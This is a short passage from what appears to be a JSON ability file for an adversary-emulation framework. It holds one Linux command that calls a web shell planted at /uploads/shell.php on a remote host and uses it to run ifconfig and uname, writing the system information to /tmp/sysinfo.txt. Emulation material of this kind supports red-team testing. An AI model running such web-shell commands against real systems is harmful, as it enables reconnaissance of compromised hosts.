            }
          },
          "linux": {
            "sh": {
              "command": "http://#{host.remote.ip}/uploads/shell.php?cmd=/sbin/ifconfig >> /tmp/sysinfo.txt;http://#{host.remote.ip}/uploads/shell.php?cmd=/bin/uname >> /tmp/sysinfo.txt"
            }
          }
        }
      },
      {
